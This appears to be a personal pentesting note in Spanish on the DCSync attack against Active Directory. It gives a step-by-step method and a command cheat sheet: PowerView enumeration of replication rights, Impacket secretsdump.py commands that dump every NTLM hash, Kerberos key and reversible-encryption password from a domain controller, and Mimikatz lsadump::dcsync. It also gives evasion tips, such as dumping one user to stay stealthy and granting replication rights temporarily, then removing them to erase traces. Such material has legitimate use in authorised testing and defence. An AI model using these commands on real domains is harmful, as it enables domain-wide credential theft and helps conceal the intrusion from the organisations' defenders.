---
tags:
  - AD
  - DC
  - attack
---
## Conceptos Clave (TL;DR)

* Es una técnica para robar la base de datos de contraseñas de Active Directory utilizando el protocolo integrado Directory Replication Service Remote Protocol.
* Permite a un atacante hacerse pasar por un Controlador de Dominio (DC) para solicitar la replicación de secretos (hashes NTLM) mediante el derecho extendido DS-Replication-Get-Changes-All.
* Requiere estrictamente control sobre una cuenta que posea los permisos "Replicating Directory Changes" y "Replicating Directory Changes All".
* Los administradores de dominio (Domain/Enterprise Admins) tienen este derecho por defecto, pero es común encontrar otras cuentas estándar con estos permisos delegados.

### Herramientas Clave

* **PowerView / ActiveDirectory Module**: Para la enumeración y validación de permisos de replicación sobre el objeto del dominio.
* **Impacket (secretsdump.py)**: Para ejecutar el ataque de forma remota desde Linux y volcar hashes NTLM, llaves Kerberos y contraseñas en texto claro.
* **runas.exe**: Para cambiar al contexto del usuario comprometido en Windows antes de lanzar el ataque.
* **Mimikatz**: Para ejecutar el ataque localmente desde un host Windows en memoria.

### Metodología Paso a Paso

**Fase 1: Enumeración y Validación**

Antes de atacar, se debe confirmar que el usuario comprometido pertenece a grupos privilegiados o posee directamente las ACLs necesarias sobre el dominio. Se obtiene el SID del usuario y se compara contra las ACLs del objeto de dominio para verificar los permisos de replicación.

**Fase 2: Ejecución Remota (Linux) o Local (Windows)**

Desde Linux, el ataque se realiza apuntando directamente al DC con credenciales válidas, extrayendo el archivo NTDS de forma remota y descifrando los secretos. Desde Windows, como las herramientas requieren ejecutarse bajo la identidad del usuario con privilegios, se debe crear un proceso temporal con dichas credenciales e inyectar la solicitud de replicación.

**Fase 3: Post-Explotación de Cuentas Sensibles**

Además de los hashes NTLM y llaves Kerberos, es crítico revisar si existen contraseñas guardadas con cifrado reversible. Si esta configuración está activa, las herramientas de dumping extraerán la clave del registro y descifrarán las contraseñas, entregándolas en texto claro.

### Cheat Sheet de Comandos

```powershell
# Importamos el módulo de PV
Import-Module .\powerview.ps1

# Obtener el SID y detalles de la cuenta comprometida para verificar membresía

Get-DomainUser -Identity <USERNAME> | select samaccountname,objectsid,memberof,useraccountcontrol | fl


# Validar si el SID específico posee permisos de replicación (DCSync) en el dominio
$sid= "<USER_SID>"

Get-ObjectAcl "<DOMAIN_DISTINGUISHED_NAME>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
  

# Enumerar cuentas que tengan la opción de Cifrado Reversible habilitada (usando módulo AD)

Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

  
# Enumerar cuentas con Cifrado Reversible habilitado (usando PowerView)

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

```bash
# Volcar todos los hashes y llaves del DC remotamente. Escribe la salida en archivos con un prefijo.
secretsdump.py -outputfile <OUTPUT_PREFIX> -just-dc <DOMAIN>/<USERNAME>@<DC_IP>


# Volcar la información de un único usuario específico (útil para ser sigiloso)
secretsdump.py -outputfile <OUTPUT_PREFIX> -just-dc-user <TARGET_USERNAME> <DOMAIN>/<USERNAME>@<DC_IP>
```

```cmd
# Generar un proceso de PowerShell en el contexto del usuario con privilegios DCSync

runas /netonly /user:<DOMAIN>\<USERNAME> powershell
  

# Ejecutar DCSync apuntando a la cuenta Administrador por defecto (desde el PowerShell generado)

.\mimikatz.exe

privilege::debug

lsadump::dcsync /domain:<DOMAIN_FQDN> /user:<DOMAIN>\<TARGET_USERNAME>
```

### "Gotchas" y Troubleshooting

* **Contexto de Ejecución en Windows**: Mimikatz **debe** ejecutarse en el contexto de seguridad del usuario que posee los privilegios DCSync. Si inicias sesión con otra cuenta, utiliza `runas.exe` para escalar al contexto adecuado.

* **Banderas Avanzadas de secretsdump**:
	* Usa `-just-dc-ntlm` si solo necesitas hashes NTLM (omite llaves Kerberos).
	* Usa `-pwd-last-set` para obtener fechas de último cambio de contraseña.
	* Usa `-history` para volcar el historial de contraseñas (ideal para cracking offline).
	* Usa `-user-status` para filtrar usuarios deshabilitados y no perder tiempo crackeando cuentas inactivas.

* **Cifrado Reversible (Reversible Encryption)**: Las contraseñas con esta configuración (`ENCRYPTED_TEXT_PWD_ALLOWED` o flag 128) no se almacenan exactamente en texto plano, sino en RC4, pero la llave para descifrarlas (Syskey) es extraída automáticamente por `secretsdump.py`. Busca estas credenciales en el archivo `<OUTPUT_PREFIX>.ntds.cleartext`.

* **Evasión Básica**: Si tienes derechos sobre un usuario (como `WriteDacl`), puedes otorgar temporalmente los permisos de replicación, ejecutar el DCSync y luego eliminarlos para limpiar tus huellas.
